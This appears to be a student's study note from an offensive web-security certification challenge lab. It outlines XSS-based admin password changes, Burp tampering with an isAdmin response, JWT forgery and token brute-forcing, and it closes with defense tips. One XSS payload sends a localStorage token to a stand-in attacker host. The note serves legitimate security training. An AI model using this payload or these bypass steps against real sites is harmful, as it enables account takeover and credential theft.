### initial web page
![[Pasted image 20250106100350.png]]
### things to try
- need to find a way of creating a user identifying what the user can do with `XSS` vulnerability,  potentially very similar to the  [[00- Learning & Research/01- Certifications/03- Offensive Security Web Assessor (OSWA)/17. Challenge Labs/12. Construction - Post OffSec Meeting/Post Enum|Post Enum]] `offsec` walkthrough machine
- find `app.js` to change `admin` password with `fetch` 
![[Pasted image 20250106112103.png]]
- very similar to `construction` machine with `fetch`, look for `change password` function found in 
- able to get token with `xss` vulnerability  but have to be quick because it resets
- make sure to look at all the `.js` files

#### Tips
```bash
#  Bypassing or Testing Admin Access in JS-Based Login Flow

## 1. Modify isAdmin in API Response (Client-Side Trust Abuse)

# Steps:
- Intercept POST https://<domain>:8443/api/login in Burp.
- Right-click â†’ "Do Interception â†’ Response to this request".
- When response appears, change:
  {
    "status": "ok",
    "token": "abc123",
    "isAdmin": "false"
  }
  â†’ to:
  {
    "status": "ok",
    "token": "abc123",
    "isAdmin": "true"
  }
- Forward the response.
- If redirected to /admin.php â†’ vulnerable to client-side trust.

## 2. Token Reuse / Bruteforce (Token Auth Weakness)

# Steps:
- Capture login response â†’ extract token:
  { "token": "eyJhbGciOi..." }

# If JWT:
- Decode at jwt.io
- Modify payload: { "isAdmin": true }
- If alg: none or weak secret, re-sign or exploit

# If custom token:
- Try guessing, fuzzing, or replaying tokens using Burp Intruder

## 3. Token Theft (XSS or MITM)

# XSS Payload:
<script>
fetch('http://attacker.com/steal?token=' + localStorage.getItem('token'));
</script>

# MITM:
- Look for unencrypted traffic or login over HTTP
- Capture token in transit

## ðŸ’¡ Defense Tips (For Notes)
- Never trust isAdmin from client.
- Validate token + role on server.
- Store token in HTTP-only cookies, not localStorage.
```

